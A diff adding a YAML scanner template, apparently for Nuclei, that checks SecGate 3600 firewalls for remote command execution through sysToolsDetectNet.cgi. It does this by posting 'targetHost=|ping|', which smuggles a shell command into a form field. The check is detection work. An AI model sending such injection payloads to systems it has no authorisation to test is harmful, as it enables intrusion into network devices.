@@ -1,0 +1,28 @@
+id: poc-yaml-secgate-3600-systoolsdetectnet-cgi-rce
+info:
+  name: SecGate 3600 Firewall sysToolsDetectNet.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/sysTools/sysToolsDetectNet.cgi"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      targetHost=|ping|
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Usage: ping"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
